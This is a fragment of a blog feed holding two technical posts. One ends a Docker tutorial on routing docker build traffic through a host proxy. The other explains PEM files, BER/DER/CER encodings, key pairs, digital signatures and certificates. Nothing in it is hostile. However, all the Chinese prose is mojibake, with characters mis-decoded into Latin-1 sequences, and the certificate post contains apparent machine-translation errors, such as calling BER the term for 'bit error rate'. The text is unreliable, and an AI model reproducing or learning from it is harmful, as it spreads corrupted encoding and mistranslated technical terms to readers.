ç«¯å£ä¸Šï¼Œä¿®æ”¹ dockerfile æ–‡ä»¶ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM golang:1.12ENV http_proxy <span class="token string">"http://127.0.0.1:1087"</span>ENV HTTP_PROXY <span class="token string">"http://127.0.0.1:1087"</span>ENV https_proxy <span class="token string">"http://127.0.0.1:1087"</span>ENV HTTPS_PROXY <span class="token string">"http://127.0.0.1:1087"</span>RUN <span class="token function">curl</span> www.google.com --max-time <span class="token number">3</span></code></pre><p>é‡æ–°æ‰§è¡Œ docker build ä¼šå‘ç° curl ä¾æ—§æ— æ³•è®¿é—® <a href="http://www.google.xn--com%2C-394fp4bweo4fbyix5exq7b9sf0p8ep61e/">www.google.comï¼Œä»æŠ¥é”™ä¿¡æ¯ä¸Šå¯ä»¥çœ‹åˆ°</a> 127.0.0.1 ä¸Šçš„ 1087 ç«¯å£ä¸Šå¹¶æ²¡æœ‰æœåŠ¡ã€‚</p><h3 id="è®¿é—®å®¿ä¸»æœº">è®¿é—®å®¿ä¸»æœº</h3><p>ç”±äº <code>container</code> é»˜è®¤æ˜¯æ¡¥æ¥ç½‘ç»œï¼Œå®¿ä¸»æœºå’Œ <code>container</code> æ˜¯å¹³çº§çš„ï¼Œè¢«æ”¾åœ¨äº†ä¸€ä¸ªè™šæ‹Ÿçš„ç½‘æ®µé‡Œã€‚è®¿é—®å®¿ä¸»æœºä¸Šçš„ä»£ç†æœåŠ¡å™¨ï¼Œå¯¹äº<code> container</code> æ¥è¯´å®é™…ä¸Šæ˜¯è®¿é—®å¦ä¸€å°æœºå™¨ä¸Šçš„æœåŠ¡å™¨ï¼Œ127.0.0.1 æŒ‡å‘çš„æ˜¯ container æœ¬èº«ã€‚åœ¨ docker é»˜è®¤çš„æ¡¥æ¥ç½‘ç»œä¸­ï¼Œå®¿ä¸»æœºçš„ IP ä¸€èˆ¬æ˜¯ <code>172.17.0.1ï¼ˆLinuxï¼‰</code>ï¼Œæˆ–è€… <code>192.168.65.1ï¼ˆMacOSï¼‰</code>ï¼Œå¯ä»¥å°† http_proxy ä¸­çš„ IP æ¢æˆ <code>172.17.0.1/192.168.65.1</code>ï¼Œæ¥å®ç°é€šè¿‡å®¿ä¸»çš„ä»£ç†æœåŠ¡å™¨è®¿é—®ç½‘ç»œï¼Œä¿®æ”¹ dockerfileï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM golang:1.12ENV http_proxy <span class="token string">"http://172.17.0.1:1087"</span>ENV HTTP_PROXY <span class="token string">"http://172.17.0.1:1087"</span>ENV https_proxy <span class="token string">"http://172.17.0.1:1087"</span>ENV HTTPS_PROXY <span class="token string">"http://172.17.0.1:1087"</span>RUN <span class="token function">curl</span> www.google.com --max-time <span class="token number">3</span></code></pre><p>è™½ç„¶ä½¿ç”¨è¿™ç§æ–¹å¼å¯ä»¥è¾¾åˆ°ç›®çš„ï¼Œä½†æ˜¯å¦‚æœç¼–è¯‘ç¯å¢ƒå˜äº†æˆ–è€…ä»£ç†æœåŠ¡å™¨çš„é…ç½®å˜äº†ï¼Œå“ªæ€•åªæ˜¯æ“ä½œç³»ç»Ÿä» Linux å˜æˆäº† MacOSï¼Œéƒ½å¾—ä¿®æ”¹ dockerfileï¼Œæ˜¾ç„¶ä¸å¤Ÿè§£è€¦ï¼Œä¹Ÿä¸æ–¹ä¾¿ã€‚</p><h3 id="é…ç½®ç½‘ç»œæ¨¡å¼">é…ç½®ç½‘ç»œæ¨¡å¼</h3><p>docker ä¸­è¿˜æœ‰ä¸€ç§ host ç½‘ç»œæ¨¡å¼ï¼Œå°±æ˜¯è®© container ä½¿ç”¨å®¿ä¸»æœºçš„ç½‘ç»œï¼Œç›¸å½“äº container åœ¨ç½‘ç»œå±‚é¢å’Œå®¿ä¸»æœºä¸åšéš”ç¦»ï¼Œä½¿ç”¨è¿™ç§ç½‘ç»œæ¨¡å¼æ‰§è¡Œ docker buildï¼Œå°±ä¸éœ€è¦åœ¨ dockerfile ä¸­æ·»åŠ  http_proxy ç¯å¢ƒå˜é‡ï¼Œcontainer å¯ä»¥ç›´æ¥è¯»å–å®¿ä¸»ä¸Šçš„ç¯å¢ƒå˜é‡ã€‚</p><p>é¦–å…ˆåœ¨å®¿ä¸»ä¸Šå¯¼å…¥ http_proxy ç¯å¢ƒå˜é‡ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">http_proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTP_PROXY</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">https_proxy</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">HTTPS_PROXY</span><span class="token operator">=</span><span class="token string">"http://127.0.0.1:7890"</span></code></pre><p>æ¥ä¸‹æ¥å°† dockerfile ç®€åŒ–ï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">FROM golang:1.12RUN <span class="token function">curl</span> www.google.com --max-time <span class="token number">3</span></code></pre><p>é‡æ–°æ‰§è¡Œ docker buildï¼ŒåŠ ä¸Šå‚æ•° â€“network hostï¼Œä½¿ç”¨å®¿ä¸»ç½‘ç»œï¼š</p><pre class="language-bash" data-language="bash"><code class="language-bash">docker build --network <span class="token function">host</span> <span class="token builtin class-name">.</span></code></pre><p>æ‰§è¡Œå curl å°±å¯ä»¥åƒåœ¨å®¿ä¸»ä¸Šç›´æ¥æ‰§è¡Œä¸€æ ·ï¼Œé€šè¿‡ä»£ç†è®¿é—® <a href="http://www.google.com/">www.google.com</a> äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æŠ€æœ¯å‘ </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¯ä¹¦é—´çš„é“é“æ²¹</title>
      <link href="/posts/b495581d/"/>
      <url>/posts/b495581d/</url>
      
        <content type="html"><![CDATA[<h1>è¯ä¹¦é—´çš„é“é“æ²¹</h1><blockquote><p>ğŸ˜„ @auther sizaif</p><p>ğŸ“† 2021-05-20  17:29:05</p></blockquote><p>[TOC]</p><h2 id="ä»€ä¹ˆæ˜¯PEMæ–‡ä»¶æ ¼å¼">ä»€ä¹ˆæ˜¯PEMæ–‡ä»¶æ ¼å¼</h2><div class="story post-story"><p>( <strong>Privacy-Enhanced Mail</strong>)</p><p>æ˜¯ä¸€ç§äº‹å®ä¸Šçš„æ–‡ä»¶æ ¼å¼ï¼Œç”¨äºå­˜å‚¨å’Œå‘é€åŠ å¯†å¯†é’¥ã€è¯ä¹¦å’Œå…¶ä»–æ•°æ®ï¼ŒåŸºäºä¸€ç»„å®šä¹‰â€œå¢å¼ºéšç§çš„é‚®ä»¶â€çš„1993 IETFæ ‡å‡†</p><p>è®¸å¤šå¯†ç å­¦æ ‡å‡†ä½¿ç”¨ASN.1æ¥å®šä¹‰å®ƒä»¬çš„æ•°æ®ç»“æ„ï¼Œå¹¶ä½¿ç”¨åŒºåˆ†ç¼–ç è§„åˆ™**<code>(Distinguished Encoding Rules, DER)</code>**æ¥åºåˆ—åŒ–è¿™äº›ç»“æ„,å› ä¸º<code>DER</code>äº§ç”ŸäºŒè¿›åˆ¶è¾“å‡ºï¼Œæ‰€ä»¥é€šè¿‡åªæ”¯æŒASCIIçš„ç³»ç»Ÿ(å¦‚ç”µå­é‚®ä»¶)ä¼ è¾“ç»“æœæ–‡ä»¶å¯èƒ½å¾ˆå›°éš¾ã€‚</p><p>PEMæ ¼å¼é€šè¿‡ä½¿ç”¨<code>base64</code>å¯¹äºŒè¿›åˆ¶æ•°æ®è¿›è¡Œç¼–ç è§£å†³äº†è¿™ä¸ªé—®é¢˜ã€‚PEMè¿˜å®šä¹‰äº†ä¸€è¡Œé¡µçœ‰ï¼ŒåŒ…æ‹¬â€œ-----BEGINâ€ã€ä¸€ä¸ªæ ‡ç­¾å’Œâ€œ-----â€;ä¸€è¡Œé¡µè„šï¼ŒåŒ…æ‹¬â€œ-----ENDâ€ã€ä¸€ä¸ªæ ‡ç­¾å’Œâ€œ-----â€ã€‚æ ‡ç­¾å†³å®šäº†ç¼–ç çš„æ¶ˆæ¯ç±»å‹ã€‚å¸¸ç”¨æ ‡ç­¾æœ‰â€œCERTIFICATEâ€ã€â€œCERTIFICATE REQUESTâ€ã€â€œPRIVATE KEYâ€ã€â€œX509 CRLâ€ç­‰ã€‚</p><p><strong>PEMæ•°æ®é€šå¸¸å­˜å‚¨åœ¨åç¼€ä¸ºâ€œ .pemâ€ï¼Œåç¼€ä¸ºâ€œ .cerâ€æˆ–â€œ .crtâ€ï¼ˆç”¨äºè¯ä¹¦ï¼‰æˆ–åç¼€â€œ .keyâ€ï¼ˆç”¨äºå…¬é’¥æˆ–ç§é’¥ï¼‰çš„æ–‡ä»¶ä¸­ã€‚[3] PEMæ–‡ä»¶ä¸­çš„æ ‡ç­¾æ¯”æ–‡ä»¶åç¼€æ›´å‡†ç¡®åœ°è¡¨ç¤ºæ•°æ®ç±»å‹ï¼Œå› ä¸ºå¯ä»¥å°†è®¸å¤šä¸åŒç±»å‹çš„æ•°æ®ä¿å­˜åœ¨â€œ .pemâ€æ–‡ä»¶ä¸­ã€‚</strong></p></div><h2 id="ä»€ä¹ˆæ˜¯X-690">ä»€ä¹ˆæ˜¯X.690</h2><div class="story post-story"><p>X.690æ˜¯ä¸€ä¸ªITU-Tæ ‡å‡†ï¼ŒæŒ‡å®šäº†å‡ ç§ASN.1ç¼–ç æ ¼å¼:</p><ul><li><a href="https://en.wikipedia.org/wiki/X.690#BER_encoding">Basic Encoding Rules</a> (BER)</li><li><a href="https://en.wikipedia.org/wiki/X.690#CER_encoding">Canonical Encoding Rules</a> (CER)</li><li><a href="https://en.wikipedia.org/wiki/X.690#DER_encoding">Distinguished Encoding Rules</a> (DER)</li></ul><p><strong>å‚è€ƒé“¾æ¥:</strong></p><p><a href="https://en.wikipedia.org/wiki/X.690#DER_encoding">https://en.wikipedia.org/wiki/X.690#DER_encoding</a></p><h3 id="BER-encoding">BER encoding</h3><p>åŸºæœ¬ç¼–ç è§„åˆ™çš„æ ¼å¼æŒ‡å®šç¼–ç ASN.1æ•°æ®ç»“æ„çš„è‡ªæè¿°å’Œè‡ªå®šç•Œæ ¼å¼ã€‚æ¯ä¸ªæ•°æ®å…ƒç´ éƒ½è¢«ç¼–ç ä¸ºç±»å‹æ ‡è¯†ç¬¦ã€é•¿åº¦æè¿°ã€å®é™…æ•°æ®å…ƒç´ ä»¥åŠå¿…è¦æ—¶çš„å†…å®¹ç»“æŸæ ‡è®°ã€‚è¿™äº›ç¼–ç ç±»å‹é€šå¸¸ç§°ä¸ºç±»å‹-é•¿åº¦-å€¼æˆ–TLVç¼–ç ã€‚è¿™ç§æ ¼å¼å…è®¸æ¥æ”¶æ–¹ä»ä¸å®Œæ•´çš„æµä¸­è§£ç ASN.1ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦ä»»ä½•å…³äºæ•°æ®çš„å¤§å°ã€å†…å®¹æˆ–è¯­ä¹‰çš„é¢„å…ˆçŸ¥è¯†</p><h3 id="DER-encoding">DER encoding</h3><p><strong>DER (Distinguished Encoding Rules)</strong> æ˜¯BERçš„ä¸€ä¸ªå—é™å˜ä½“ï¼Œç”¨äºä¸ºASN.1æè¿°çš„æ•°æ®ç»“æ„äº§ç”Ÿæ˜ç¡®çš„ä¼ è¾“è¯­æ³•ã€‚åƒCER, DERç¼–ç æ˜¯æœ‰æ•ˆçš„BERç¼–ç ã€‚é™¤ä¸€ä¸ªå‘é€è€…çš„é€‰é¡¹å¤–ï¼ŒDERä¸BERæ˜¯ä¸€æ ·çš„ã€‚</p><p>DERæ˜¯BERçš„å­é›†ï¼Œæä¾›äº†ä¸€ç§å¯¹ASN.1å€¼è¿›è¡Œç¼–ç çš„æ–¹æ³•ã€‚DERé€‚ç”¨äºéœ€è¦å”¯ä¸€ç¼–ç çš„æƒ…å†µï¼Œä¾‹å¦‚åœ¨å¯†ç å­¦ä¸­ï¼Œå¹¶ç¡®ä¿éœ€è¦è¿›è¡Œæ•°å­—ç­¾åçš„æ•°æ®ç»“æ„äº§ç”Ÿå”¯ä¸€çš„åºåˆ—åŒ–è¡¨ç¤ºã€‚DERå¯ä»¥è¢«è®¤ä¸ºæ˜¯è¯¯ç ç‡çš„æ ‡å‡†å½¢å¼ã€‚ä¾‹å¦‚ï¼Œåœ¨BERä¸­ï¼Œä¸€ä¸ªå¸ƒå°”å€¼trueå¯ä»¥è¢«ç¼–ç ä¸º255ä¸ªéé›¶å­—èŠ‚å€¼ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œè€Œåœ¨DERä¸­ï¼Œæœ‰ä¸€ç§æ–¹æ³•å¯ä»¥å°†å¸ƒå°”å€¼trueç¼–ç ã€‚</p><p>æœ€é‡è¦çš„DERç¼–ç çº¦æŸæ˜¯:</p><ol><li><p>é•¿åº¦ç¼–ç å¿…é¡»ä½¿ç”¨ç¡®å®šçš„å½¢å¼</p><p>â€‹æ­¤å¤–ï¼Œå¿…é¡»ä½¿ç”¨å°½å¯èƒ½çŸ­çš„é•¿åº¦ç¼–ç </p></li><li><p>ä½å­—ç¬¦ä¸²ã€å…«å­—èŠ‚å­—ç¬¦ä¸²å’Œå—é™å­—ç¬¦ä¸²å¿…é¡»ä½¿ç”¨åŸå§‹ç¼–ç </p></li><li><p>Setä¸­çš„å…ƒç´ æ ¹æ®æ ‡è®°å€¼æŒ‰æ’åºé¡ºåºè¿›è¡Œç¼–ç </p></li></ol><p><strong>DERå¹¿æ³›ç”¨äºX.509ç­‰æ•°å­—è¯ä¹¦ã€‚</strong></p><h3 id="CER-encoding">CER encoding</h3><p>CER(è§„èŒƒç¼–ç è§„åˆ™)æ˜¯BERçš„ä¸€ç§å—é™å˜ä½“ï¼Œç”¨äºä¸ºASN.1æè¿°çš„æ•°æ®ç»“æ„ç”Ÿæˆæ˜ç¡®çš„ä¼ è¾“è¯­æ³•ã€‚BERæä¾›äº†å¯¹æ•°æ®å€¼å¦‚ä½•ç¼–ç çš„é€‰æ‹©ï¼Œè€ŒCER(è¿åŒDER)åªä»åŸºæœ¬ç¼–ç è§„åˆ™å…è®¸çš„ç¼–ç ä¸­é€‰æ‹©ä¸€ç§ç¼–ç ï¼Œæ¶ˆé™¤äº†å…¶ä»–é€‰é¡¹ã€‚å½“å¿…é¡»ä¿ç•™ç¼–ç æ—¶ï¼ŒCERæ˜¯æœ‰ç”¨çš„;ä¾‹å¦‚ï¼Œåœ¨è¯åˆ¸äº¤æ˜“ä¸­</p><h3 id="BERã€CERã€DERæ¯”è¾ƒ">BERã€CERã€DERæ¯”è¾ƒ</h3><p><code>BERæ ¼å¼</code>å’Œ<code>CER</code>æˆ–<code>DER</code>æ ¼å¼ä¹‹é—´çš„å…³é”®åŒºåˆ«æ˜¯åŸºæœ¬ç¼–ç è§„åˆ™æä¾›çš„çµæ´»æ€§</p><p><code>BER</code>ï¼Œå¦‚ä¸Šæ‰€è¿°ï¼Œæ˜¯ITU-T X.690ç»™å‡ºçš„ç”¨äºASN.1æ•°æ®ç»“æ„ä¼ è¾“çš„ç¼–ç è§„åˆ™çš„åŸºæœ¬é›†åˆã€‚å®ƒä¸ºå‘é€æ–¹æƒ³è¦å‘é€çš„æ•°æ®ç»“æ„æä¾›äº†æ˜ç¡®çš„ç¼–ç è§„åˆ™ï¼Œä½†ä¹Ÿç»™å‘é€æ–¹ç•™ä¸‹äº†ä¸€äº›ç¼–ç é€‰æ‹©.æ­£å¦‚X.690æ ‡å‡†ä¸­æ‰€è¿°ï¼Œâ€œä½œä¸ºå‘é€æ–¹çš„é€‰é¡¹ï¼ŒåŸºæœ¬ç¼–ç è§„åˆ™å…è®¸æ›¿ä»£ç¼–ç ã€‚â€å£°ç§°ç¬¦åˆåŸºæœ¬ç¼–ç è§„åˆ™çš„æ¥æ”¶æ–¹åº”æ”¯æŒæ‰€æœ‰æ›¿ä»£æ–¹æ¡ˆâ€</p><p>æ¥æ”¶æ–¹å¿…é¡»å‡†å¤‡å¥½æ¥å—æ‰€æœ‰åˆæ³•ç¼–ç ï¼Œæ‰èƒ½åˆæ³•å£°æ˜<code>BER-compliance</code>,ç›¸æ¯”ä¹‹ä¸‹ï¼Œ<code>CER</code>å’Œ<code>DER</code>éƒ½å°†å¯ç”¨é•¿åº¦è§„èŒƒé™åˆ¶ä¸ºå•ä¸ªé€‰é¡¹ã€‚å› æ­¤ï¼Œ<code>CER</code>å’Œ<code>DER</code>æ˜¯è¯¯ç ç‡çš„é™åˆ¶å½¢å¼ï¼Œç”¨äºæ¶ˆé™¤è¯¯ç ç‡æ ‡å‡†çš„æ­§ä¹‰ã€‚</p><p><code>CER</code>å’Œ<code>DER</code>çš„ä¸åŒä¹‹å¤„åœ¨äºå®ƒä»¬å¯¹å‘é€æ–¹æ–½åŠ çš„é™åˆ¶ã€‚<code>CER</code>å’Œ<code>DER</code>çš„åŸºæœ¬åŒºåˆ«æ˜¯ï¼Œåœ¨æŸäº›ç²¾ç¡®å®šä¹‰çš„æƒ…å†µä¸‹ï¼Œ<code>DER</code>é‡‡ç”¨å®šé•¿å½¢å¼ï¼Œ<code>CER</code>é‡‡ç”¨ä¸å®šé•¿å½¢å¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>DER</code>æ€»æ˜¯å…·æœ‰å‰å¯¼é•¿åº¦ä¿¡æ¯ï¼Œè€Œ<code>CER</code>ä½¿ç”¨å†…å®¹ç»“æŸå…«ä½å…ƒï¼Œè€Œä¸æ˜¯æä¾›ç¼–ç æ•°æ®çš„é•¿åº¦ã€‚å› æ­¤ï¼Œå¯¹äºå¤§çš„ç¼–ç å€¼ï¼Œ<code>CER</code>éœ€è¦è¾ƒå°‘çš„å…ƒæ•°æ®ï¼Œè€Œå¯¹äºå°çš„ç¼–ç å€¼ï¼Œ<code>DER</code>éœ€è¦è¾ƒå°‘çš„å…ƒæ•°æ®ã€‚</p><p>ä¸ºäº†ä¾¿äºç¼–ç è§„åˆ™ä¹‹é—´çš„é€‰æ‹©ï¼ŒX.690æ ‡å‡†æ–‡æ¡£æä¾›äº†ä»¥ä¸‹æŒ‡å¯¼:</p><p>å¦‚æœç¼–ç çš„å€¼è¶³å¤Ÿå°ï¼Œèƒ½å¤Ÿé€‚åº”å¯ç”¨å†…å­˜ï¼Œå¹¶ä¸”éœ€è¦å¿«é€Ÿè·³è¿‡ä¸€äº›åµŒå¥—çš„å€¼ï¼Œé‚£ä¹ˆåŒºåˆ†ç¼–ç è§„åˆ™æ¯”è§„èŒƒç¼–ç è§„åˆ™æ›´åˆé€‚ã€‚è§„èŒƒåŒ–ç¼–ç è§„åˆ™æ¯”æ°å‡ºçš„ç¼–ç è§„åˆ™æ›´åˆé€‚çš„å¦‚æœæœ‰éœ€è¦ç¼–ç å€¼å¤ªå¤§äº†,ä»–ä»¬ä¸èƒ½è½»æ˜“é€‚åº”å¯ç”¨å†…å­˜æˆ–éœ€è¦ç¼–ç å’Œä¼ è¾“çš„ä¸€éƒ¨åˆ†ä»·å€¼åœ¨æ•´ä¸ªä»·å€¼æ˜¯å¯ç”¨çš„ã€‚åŸºæœ¬ç¼–ç è§„åˆ™æ¯”è§„èŒƒçš„æˆ–ä¸“æœ‰çš„ç¼–ç è§„åˆ™iæ›´åˆé€‚</p></div><h2 id="å…¬é’¥-ç§é’¥-æ•°å­—è¯ä¹¦">å…¬é’¥,ç§é’¥,æ•°å­—è¯ä¹¦</h2><div class="story post-story"><h3 id="å…¬é’¥ç§é’¥">å…¬é’¥ç§é’¥</h3><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210520212726.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210520212726.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="629313-20151122161624827-1966568154"></p><p>Bobæœ‰ä¸¤æŠŠé’¥åŒ™ï¼Œä¸€æŠŠå«å…¬é’¥ï¼ˆpublic keyï¼‰ï¼Œä¸€æŠŠå«ç§é’¥ï¼ˆprivate keyï¼‰</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210520212801.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210520212801.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="629313-20151122161551327-1906130388"></p><p>Bobçš„å…¬é’¥å¯ä»¥å…¬å¼€ä¾›å…¶ä»–äººä½¿ç”¨ï¼Œä»–åªä¿ç•™è‡ªå·±çš„ç§é’¥ã€‚å…¬é’¥å’Œç§é’¥ç”¨æ¥åŠ è§£å¯†æ•°æ®ï¼Œå¦‚æœä½¿ç”¨ä»»æ„ä¸€æŠŠæ¥åŠ å¯†æ•°æ®ï¼Œé‚£ä¹ˆåªæœ‰ä½¿ç”¨å¦å¤–ä¸€æŠŠæ‰èƒ½è§£å¯†æ•°æ®ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210520212838.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210520212838.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="629313-20151122163018436-693407030"></p><p>Susanæƒ³ç»™Bobå†™ä¿¡ï¼Œå¥¹å¯ä»¥ä½¿ç”¨Bobçš„å…¬é’¥å°†å†…å®¹åŠ å¯†ä»¥åå‘é€ç»™Bobï¼ŒBobæ”¶åˆ°ä»¥åï¼Œä½¿ç”¨ç§é’¥è§£å¯†ä»¥ä¾¿é˜…è¯»å†…å®¹ã€‚Bobçš„çš„å…¶ä»–åŒäº‹å³ä½¿æˆªè·äº†Susanå‘é€ç»™Bobçš„ä¿¡ä»¶ï¼Œç”±äºæ²¡æœ‰Bobçš„ç§é’¥ï¼Œä¹Ÿæ— æ³•è§£å¯†ï¼Œä»è€Œç¡®ä¿æ•°æ®å®‰å…¨ã€‚ä»¥ä¸Šå°±æ˜¯ä½¿ç”¨å…¬é’¥å’Œç§é’¥åŠ è§£å¯†çš„è¿‡ç¨‹æ¼”ç¤ºã€‚</p><p>å¦‚æœBobç»™Susanå›ä¿¡ï¼Œå¦‚ä½•ä¿è¯æ•°æ®å®‰å…¨å‘¢ï¼Ÿä»–å¯ä»¥ä½¿ç”¨Susançš„å…¬é’¥åŠ å¯†æ¶ˆæ¯åå‘ç»™Susanï¼ŒSusanä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†åé˜…è¯»ã€‚æ‰€ä»¥ä¿æŠ¤å¥½è‡ªå·±çš„ç§é’¥æ˜¯å¤šä¹ˆé‡è¦çš„äº‹æƒ…å•Šã€‚</p><h3 id="æ•°å­—ç­¾å">æ•°å­—ç­¾å</h3><p>ç°åœ¨Bobå†³å®šç»™Patå†™ä¸€ä»½ä¿¡ï¼Œä¿¡ä»¶çš„å†…å®¹ä¸ç”¨åŠ å¯†ï¼Œä½†æ˜¯è¦ä¿è¯Patæ”¶åˆ°ä¿¡ä»¶åï¼Œèƒ½å¤Ÿç¡®è®¤ä¿¡ä»¶çš„ç¡®æ˜¯Bobå‘å‡ºçš„ï¼Œè€Œä¸æ˜¯åˆ«äººå†’å……Bobå‘ç»™Patçš„ï¼Œåº”è¯¥å¦‚æœåšå‘¢ï¼Ÿ</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210520213004.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210520213004.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="629313-20151122163932046-1763066023"></p><p>Bobå°†ä¿¡ä»¶é€šè¿‡hashè½¯ä»¶è®¡ç®—ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€ä¸²æ¶ˆæ¯æ‘˜è¦ï¼ˆæœ‰çš„æ–‡ç« ä¹Ÿç§°ä¹‹ä¸ºâ€œhashå€¼â€ï¼‰ã€‚è¿™ä¸€è¿‡ç¨‹èƒ½å¤Ÿä¿è¯2ç‚¹ï¼š</p><p>1ã€è¿‡ç¨‹ä¸å¯é€†ã€‚å³ä¸èƒ½é€šè¿‡æ¶ˆæ¯æ‘˜è®¡ç®—å‡ºä¿¡ä»¶çš„å†…å®¹ã€‚</p><p>2ã€æ¶ˆæ¯æ‘˜è¦ä¸ä¼šé‡å¤ã€‚å³å¦‚æœä¿¡ä»¶æœ‰ä»»ä½•æ”¹åŠ¨ï¼Œå†æ¬¡hashè®¡ç®—å‡ºçš„æ¶ˆæ¯æ‘˜è¦ä¸€å®šä¸ä¼šå’Œæ”¹åŠ¨å‰çš„æ¶ˆæ¯æ‘˜è¦ä¸€è‡´ã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210520213103.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210520213103.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="629313-20151122165949765-1082349152"></p><p>ç„¶åï¼ŒBobä½¿ç”¨è‡ªå·±çš„ç§é’¥ï¼Œå°†æ¶ˆæ¯æ‘˜è¦åŠ å¯†ã€‚åŠ å¯†åçš„ç»“æœï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œæ•°å­—ç­¾åâ€ã€‚ç°åœ¨ï¼ŒBobå°±å¯ä»¥å°†ä¿¡ä»¶è¿åŒæ•°å­—ç­¾åä¸€èµ·å‘ç»™Patã€‚</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210520213139.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210520213139.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="629313-20151122170543796-107989233"></p><p>Patæ”¶åˆ°ä¿¡ä»¶ä»¥åï¼Œä¼šåš2ä»¶äº‹ï¼š</p><p>1ã€ä½¿ç”¨Bobçš„å…¬é’¥å°†æ•°å­—ç­¾åè§£å¯†ï¼Œå¦‚æœé¡ºåˆ©è§£å¯†ï¼Œè¯´æ˜çš„ç¡®æ˜¯Bobç­¾å‘çš„æ•°å­—ç­¾åï¼Œä¸æ˜¯åˆ«äººç­¾å‘çš„ï¼Œå› ä¸ºBobçš„ç§é’¥æ²¡æœ‰å…¬å¼€ã€‚2ã€Patä½¿ç”¨hashè½¯ä»¶å¯¹ä¿¡ä»¶å†æ¬¡è¿›è¡Œhashè®¡ç®—ï¼Œå’Œè§£å¯†æ•°å­—ç­¾åå¾—åˆ°çš„æ¶ˆæ¯æ‘˜è¦å¯¹æ¯”ï¼Œå¦‚æœä¸€è‡´ï¼Œè¯´æ˜ä¿¡ä»¶æ²¡æœ‰ç¯¡æ”¹ï¼Œç¡®å®æ˜¯Bobå‘å‡ºçš„ã€‚è¿™å°±æ˜¯æ•°å­—ç­¾åçš„è¿‡ç¨‹ã€‚å®ƒèƒ½å¤Ÿç¡®ä¿ç­¾åäººå‘å‡ºçš„æ¶ˆæ¯ä¸è¢«ç¯¡æ”¹ï¼Œä¹Ÿèƒ½è¯æ˜çš„ç¡®æ˜¯ç­¾åäººå‘å‡ºçš„æ¶ˆæ¯ã€‚</p><h3 id="æ•°å­—è¯ä¹¦">æ•°å­—è¯ä¹¦</h3><p>ä½¿ç”¨æ•°å­—è¯ä¹¦å¯ä»¥ç¡®ä¿å…¬é’¥ä¸è¢«å†’å……ã€‚æ•°å­—è¯ä¹¦æ˜¯ç»è¿‡æƒå¨æœºæ„ï¼ˆCAï¼‰è®¤è¯çš„å…¬é’¥ï¼Œé€šè¿‡æŸ¥çœ‹æ•°å­—è¯ä¹¦ï¼Œå¯ä»¥çŸ¥é“è¯¥è¯ä¹¦æ˜¯ç”±é‚£å®¶æƒå¨æœºæ„ç­¾å‘çš„ï¼Œè¯ä¹¦ä½¿ç”¨äººçš„ä¿¡æ¯ï¼Œä½¿ç”¨äººçš„å…¬é’¥ã€‚å®ƒæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š</p><p>1ã€ç”±ä¸“é—¨çš„æœºæ„ç­¾å‘çš„æ•°å­—è¯ä¹¦æ‰å®‰å…¨æœ‰æ•ˆã€‚</p><p>2ã€ç­¾å‘æ•°å­—è¯ä¹¦æ˜¯æ”¶è´¹çš„ã€‚</p><p>3ã€ä¸ä¼šè¢«å†’å……ï¼Œå®‰å…¨å¯ä¿¡ã€‚</p><p>4ã€æ•°å­—è¯ä¹¦æœ‰ä½¿ç”¨æœŸé™ï¼Œè¿‡äº†ä½¿ç”¨æœŸé™ï¼Œè¯ä¹¦å˜ä¸ºä¸å¯ç”¨ã€‚CAä¹Ÿå¯ä»¥åœ¨è¯•ç”¨æœŸå†…ï¼Œå¯¹è¯ä¹¦è¿›è¡Œä½œåºŸæ“ä½œã€‚</p><h3 id="å…¬é’¥ç§é’¥è¯ä¹¦ç”Ÿæˆ">å…¬é’¥ç§é’¥è¯ä¹¦ç”Ÿæˆ</h3><p>å‚è€ƒ:  <code>ç”ŸæˆOpenSSL &amp;&amp; GntTLS &amp;&amp; WolfSSL keys æ–‡æ¡£ </code></p></div>]]></content>
      
      
      <categories>
          
